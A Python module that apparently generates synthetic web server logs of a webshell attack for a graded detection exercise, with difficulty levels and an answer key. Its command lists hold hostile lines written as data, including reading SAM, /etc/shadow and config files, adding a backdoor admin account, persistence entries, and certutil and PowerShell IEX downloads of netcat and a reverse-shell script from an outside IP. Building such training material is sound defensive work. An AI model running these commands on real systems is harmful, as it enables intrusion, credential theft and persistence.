"""Webshell attack scenario — RCE via .cache-img.php in uploads."""
import random
from datetime import datetime
from .config import (ATTACKER_USER_AGENTS, pick, pick_n, rand_between,
                     get_override, get_attacker_ips, format_log_line)


def get_webshell_commands(difficulty='medium'):
    recon = [
        ('whoami', 'whoami'),
        ('id', 'id'),
        ('hostname', 'hostname'),
        ('uname -a', 'uname%20-a'),
        ('pwd', 'pwd'),
        ('ipconfig', 'ipconfig'),
        ('systeminfo', 'systeminfo'),
        ('dir C:\\xampp\\htdocs', 'dir%20C%3A%5Cxampp%5Chtdocs'),
        ('type C:\\xampp\\htdocs\\brightmall\\includes\\db.php',
         'type%20C%3A%5Cxampp%5Chtdocs%5Cbrightmall%5Cincludes%5Cdb.php'),
        ('echo %USERNAME%', 'echo%20%25USERNAME%25'),
        ('echo %COMPUTERNAME%', 'echo%20%25COMPUTERNAME%25'),
    ]
    enum = [
        ('net user', 'net%20user'),
        ('net localgroup administrators', 'net%20localgroup%20administrators'),
        ('tasklist', 'tasklist'),
        ('netstat -ano', 'netstat%20-ano'),
        ('dir C:\\Users', 'dir%20C%3A%5CUsers'),
        ('dir C:\\xampp\\mysql\\data', 'dir%20C%3A%5Cxampp%5Cmysql%5Cdata'),
        ('type C:\\xampp\\phpMyAdmin\\config.inc.php',
         'type%20C%3A%5Cxampp%5CphpMyAdmin%5Cconfig.inc.php'),
        ('type C:\\xampp\\passwords.txt', 'type%20C%3A%5Cxampp%5Cpasswords.txt'),
        ('reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
         'reg%20query%20HKLM%5CSOFTWARE%5CMicrosoft%5CWindows%5CCurrentVersion%5CRun'),
        ('wmic os get caption,version', 'wmic%20os%20get%20caption%2Cversion'),
    ]
    persistence = [
        ('net user hacker P@ssw0rd123! /add',
         'net%20user%20hacker%20P%40ssw0rd123%21%20%2Fadd'),
        ('net localgroup administrators hacker /add',
         'net%20localgroup%20administrators%20hacker%20%2Fadd'),
        ('schtasks /create /tn WindowsUpdate /tr C:\\Windows\\Temp\\svchost.exe /sc onstart',
         'schtasks%20%2Fcreate%20%2Ftn%20WindowsUpdate%20%2Ftr%20C%3A%5CWindows%5CTemp%5Csvchost.exe%20%2Fsc%20onstart'),
        ('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Windows\\Temp\\svchost.exe',
         'reg%20add%20HKCU%5CSoftware%5CMicrosoft%5CWindows%5CCurrentVersion%5CRun%20%2Fv%20Updater%20%2Fd%20C%3A%5CWindows%5CTemp%5Csvchost.exe'),
    ]
    exfil = [
        ('certutil -urlcache -split -f http://185.156.73.54/nc.exe C:\\Windows\\Temp\\nc.exe',
         'certutil%20-urlcache%20-split%20-f%20http%3A%2F%2F185.156.73.54%2Fnc.exe%20C%3A%5CWindows%5CTemp%5Cnc.exe'),
        ('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://185.156.73.54/rev.ps1\')',
         'powershell%20IEX(New-Object%20Net.WebClient).DownloadString(\'http%3A%2F%2F185.156.73.54%2Frev.ps1\')'),
        ('type C:\\Windows\\System32\\config\\SAM',
         'type%20C%3A%5CWindows%5CSystem32%5Cconfig%5CSAM'),
    ]
    linux_recon = [
        ('cat /etc/passwd', 'cat%20%2Fetc%2Fpasswd'),
        ('cat /etc/shadow', 'cat%20%2Fetc%2Fshadow'),
        ('find / -perm -u=s -type f 2>/dev/null',
         'find%20%2F%20-perm%20-u%3Ds%20-type%20f%202%3E%2Fdev%2Fnull'),
        ('ls -la /var/www', 'ls%20-la%20%2Fvar%2Fwww'),
        ('cat /var/www/html/brightmall/includes/db.php',
         'cat%20%2Fvar%2Fwww%2Fhtml%2Fbrightmall%2Fincludes%2Fdb.php'),
    ]

    if difficulty == 'easy':
        return recon
    elif difficulty == 'hard':
        return recon + enum + persistence + exfil + linux_recon
    return recon + enum


def get_shell_paths(difficulty='medium'):
    if difficulty == 'easy':
        return ['/uploads/products/.cache-img.php']
    elif difficulty == 'hard':
        return [
            '/uploads/products/.cache-img.php',
            '/uploads/avatars/.thumb.php',
            '/assets/img/cache/.loader.php',
        ]
    return ['/uploads/products/.cache-img.php', '/uploads/avatars/.thumb.php']


def get_shell_params(difficulty='medium'):
    if difficulty == 'easy':
        return ['cmd']
    elif difficulty == 'hard':
        return ['cmd', 'v', 'id', 'q']
    return ['cmd', 'v']


def generate_webshell(attacker_count, difficulty, start_time, end_time, overrides=None):
    lines = []
    answers = {
        'type': 'Webshell',
        'shell_paths': [],
        'attacker_ips': [],
        'commands_executed': [],
    }

    custom_path = get_override(overrides, 'shell_path', None)
    custom_param = get_override(overrides, 'shell_param', None)
    custom_cmds = get_override(overrides, 'shell_commands', None)

    attacker_ips = get_attacker_ips(overrides, attacker_count)
    if custom_cmds and isinstance(custom_cmds, list) and custom_cmds:
        commands = [(c, c.replace(' ', '%20')) for c in custom_cmds]
    else:
        commands = get_webshell_commands(difficulty)

    shell_paths = [custom_path] if custom_path else get_shell_paths(difficulty)
    shell_params = [custom_param] if custom_param else get_shell_params(difficulty)

    start_ts = int(start_time.timestamp())
    end_ts = int(end_time.timestamp())
    answers['attacker_ips'] = attacker_ips
    answers['shell_paths'] = shell_paths

    for idx, ip in enumerate(attacker_ips):
        ua = pick(ATTACKER_USER_AGENTS)
        shell_path = shell_paths[idx % len(shell_paths)]
        param = shell_params[idx % len(shell_params)]
        attack_start = random.randint(
            start_ts + int((end_ts - start_ts) * 0.2),
            start_ts + int((end_ts - start_ts) * 0.5)
        )
        current_ts = attack_start

        counts = {'easy': (6, 10), 'medium': (12, 20), 'hard': (18, len(commands))}
        lo, hi = counts.get(difficulty, (12, 20))
        selected = commands[:random.randint(lo, min(hi, len(commands)))]

        for cmd_raw, cmd_enc in selected:
            path = f'{shell_path}?{param}={cmd_enc}'
            answers['commands_executed'].append(cmd_raw)
            ts = datetime.fromtimestamp(current_ts)
            lines.append({
                'timestamp': ts,
                'line': format_log_line(ip, ts, 'GET', path, 'HTTP/1.1',
                                        200, rand_between(128, 8192), '-', ua),
            })
            current_ts += random.randint(1, 5) if random.randint(1, 4) == 1 else random.randint(8, 45)

    answers['commands_executed'] = list(dict.fromkeys(answers['commands_executed']))
    return {'lines': lines, 'answers': answers}
